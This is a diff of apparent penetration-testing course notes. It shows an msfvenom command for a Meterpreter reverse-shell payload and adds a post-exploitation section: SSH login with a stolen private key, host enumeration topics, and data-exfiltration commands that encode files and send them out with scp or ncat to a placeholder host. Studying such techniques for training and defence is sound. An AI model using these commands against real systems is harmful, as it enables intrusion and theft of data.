@@ -400,15 +400,26 @@ BACK TO POWERSHELL
         msfvenom -p windows/meterpreter/reverse_tcp lhost=<lin ops host ip> lport=4444 -b " \x00\xfe\x20\x0a\xff" -f python
         
         # copy everything but first line and put into
+*************************************************************************************************************************************
 
+                                              POST EXPLOITATION
 
+ssh -i /home/student/stolenkey jane@1.2.3.4 # -i is identify as the following user. its a stolen private ssh key
 
+Local host enumeration
+  User Enumeration - provides who has what priviledges and use to our advantage
+  Process Enumeration - provides what procesess can be exploited, find whats connected to the Kernel
+  Service Enumeration - to find what ports are running what services (back ground programs, whos got access to resoruces)
+  Network Enumeration - find interfaces and next jump ip, see whos connected and why
 
-
-
-
-
-
+Data Exfiltration
+  Session Transcript - ssh <user>@<host> | tee
+  Obfuscation (Windos) - type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out 
+                          certutil -encode <file> encoded.b64
+  Obfuscation (Linux) - cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
+                        cat <file>> | base64
+  Encrypted Transport - scp <source> <destination>
+                        ncat --ssl <ip> <port> < <file>
 
 
 
